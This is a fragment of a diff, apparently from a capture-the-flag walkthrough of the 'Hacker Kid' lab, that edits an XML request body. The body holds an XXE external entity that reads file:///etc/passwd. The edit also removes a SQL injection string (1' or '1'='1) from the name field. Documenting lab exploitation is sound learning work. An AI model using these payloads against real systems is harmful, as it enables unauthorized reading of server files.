@@ -157,7 +157,7 @@ blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackh
 <!ENTITY f SYSTEM "file:///etc/passwd">
 ]>
 <root>
-	<name>1' or '1'='1</name>
+	<name></name>
 	<tel>2</tel>
 	<email>
 	&f;
